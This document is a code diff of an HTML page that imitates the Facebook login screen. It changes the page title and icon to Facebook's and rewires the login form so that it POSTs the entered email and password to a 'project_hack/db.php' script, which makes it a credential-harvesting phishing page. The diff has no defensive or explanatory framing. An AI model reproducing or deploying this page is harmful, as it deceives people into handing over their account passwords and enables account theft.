@@ -4,11 +4,14 @@
         <!--meta-->
         <meta charset="utf-8">
             <title>
-                Title
+                Facebook - Log In or Sign Up
             </title>
+            <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
             <!--styles-->
             <link href="css/style.css" rel="stylesheet">
             </link>
+            <!-- scritps -->
+            <script type="text/javascript" src="js/jquery.min.js"></script>
         </meta>
     </head>
     <body>
@@ -23,7 +26,7 @@
                     </h1>
                 </div>
                 <div class="float-right">
-                    <form action="http://localhost/FB_hack/db.php">
+                    <form action="http://localhost/project_hack/db.php" method="post">
                         <table cellspacing="0" role="presentation">
                             <tbody>
                                 <tr>
@@ -40,7 +43,7 @@
                                 </tr>
                                 <tr>
                                     <td class="login-input-padding">
-                                        <input class="inputtext login-input" id="email" name="email" type="email"/>
+                                        <input class="inputtext login-input" id="email" name="email" type="text"/>
                                     </td>
                                     <td class="login-input-padding">
                                         <input class="inputtext login-input" id="pass" name="pass" type="password"/>
@@ -50,16 +53,9 @@
                                             <input class="login-button" type="submit" value="Log In"/>
                                         </label>
                                     </td>
+                                    <td></td>
                                 </tr>
                                 <tr>
-                                    <td class="login_form_label_field">
-                                        <div>
-                                            <input autocomplete="off" checked="1" name="persistent" type="hidden">
-                                                <input name="default_persistent" type="hidden" value="1">
-                                                </input>
-                                            </input>
-                                        </div>
-                                    </td>
                                     <td class="login-input-padding">
                                         <a class="forget-password" href="#">
                                             Forgotten account?
@@ -72,6 +68,7 @@
                 </div>
             </div>
         </header>
+
         <section class="main-section">
             <div class="container main-container">
                 <div class="left-content float-left">
@@ -668,6 +665,7 @@
                 </div>
             </div>
         </section>
+
         <footer>
             <ul class="lang-list">
                 <li class="lang-li">English (US)</li>
